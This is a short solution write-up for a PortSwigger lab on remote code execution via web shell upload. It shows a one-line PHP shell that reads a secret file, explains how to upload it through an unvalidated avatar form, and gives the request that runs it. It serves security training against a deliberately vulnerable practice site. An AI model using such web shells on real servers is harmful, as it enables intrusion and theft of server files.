# Remote code execution via web shell upload

**Lab Url**: [https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload](https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload)

## Objective

This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

The avatar upload function does not validate file types. We can upload a PHP script and execute it on the server.

### Step 1: Upload a PHP web shell

Upload a file named `exploit.php` with the following content via the avatar upload form on the My Account page:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The application accepts the file and stores it in `/files/avatars/`.

### Step 2: Retrieve the secret

Visit the uploaded shell:

```http
GET /files/avatars/exploit.php
```

The PHP script executes and returns the contents of `/home/carlos/secret`. Submit this secret to solve the lab.
 